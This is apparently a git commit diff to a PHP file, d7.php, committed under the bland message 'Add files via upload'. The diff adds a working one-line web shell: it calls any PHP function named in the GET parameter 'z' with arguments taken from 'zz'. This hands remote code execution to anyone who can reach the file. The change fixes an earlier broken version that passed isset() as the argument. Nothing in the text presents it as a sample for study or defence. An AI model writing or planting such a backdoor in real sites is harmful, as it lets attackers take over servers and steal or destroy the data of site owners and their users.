631a59eff1b5b4d8fb8f343315a1ddfbb7248173
maximo896 <della.maximo896@anglernook.com>
2024-12-03 20:34:15 +0800

    Add files via upload

--- d7.php
+++ d7.php
@@ -1,2 +1,2 @@
 <?php
-isset($_GET['z']) and isset($_GET['zz']) and var_dump(call_user_func_array($_GET['z'],isset($_GET['zz'])));
+isset($_GET['z']) and isset($_GET['zz']) and var_dump(call_user_func_array($_GET['z'],$_GET['zz']));
